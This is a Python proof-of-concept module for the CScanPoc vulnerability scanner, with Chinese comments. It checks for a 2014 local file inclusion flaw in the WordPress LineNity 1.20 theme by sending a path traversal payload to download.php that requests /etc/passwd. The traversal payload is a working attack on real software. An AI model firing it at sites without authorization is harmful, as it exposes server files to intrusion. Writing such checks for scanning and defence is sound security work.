# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0049'  # 平台漏洞编号，留空
    name = 'WordPress LineNity 1.20主题 本地文件包含漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-04-14'  # 漏洞公布时间
    desc = '''
        WordPress LineNity 1.20 主题 本地文件包含漏洞。
        /wp-content/themes/linenity/functions/download.php?imgurl=
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/32861/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress LineNity 1.20主题'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1cd6a607-ae97-4fc4-984e-34642690c53f'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../../../../../../../../../../../../etc/passwd'
            url = arg + payload
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and 'root' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
